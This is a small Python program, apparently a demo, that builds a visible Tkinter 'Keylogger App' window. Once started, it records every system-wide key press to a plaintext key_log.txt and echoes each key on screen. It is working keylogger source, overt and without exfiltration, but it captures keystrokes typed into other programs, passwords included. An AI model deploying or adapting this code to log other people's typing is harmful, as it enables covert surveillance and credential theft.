import tkinter as tk
from pynput.keyboard import Key, Listener
import threading

# Function to log keys and display in the Tkinter window
def on_press(key):
    try:
        current_key = f"Key {key.char} pressed"
    except AttributeError:
        current_key = f"Special key {key} pressed"
    
    # Update the label with the current key press
    display_label.config(text=current_key)
    
    # Append to log file
    with open("key_log.txt", "a") as log_file:
        log_file.write(f"{current_key}\n")

def on_release(key):
    if key == Key.esc:
        # Stop the listener if 'Esc' is pressed
        return False

# Function to start keylogger
def start_keylogger():
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

# Function to handle start button click
def start_logging():
    threading.Thread(target=start_keylogger).start()

# Function to quit the application
def quit_app():
    root.quit()

# Set up the Tkinter window
root = tk.Tk()
root.title("Keylogger App")
root.geometry("400x300")

# Create a label to display which key is pressed
display_label = tk.Label(root, text="Press a key...", font=("Helvetica", 14))
display_label.pack(pady=20)

# Create start and quit buttons
start_button = tk.Button(root, text="Start Keylogger", command=start_logging, width=25, height=2)
start_button.pack(pady=20)

quit_button = tk.Button(root, text="Quit", command=quit_app, width=25, height=2)
quit_button.pack(pady=20)

# Run the Tkinter loop
root.mainloop()
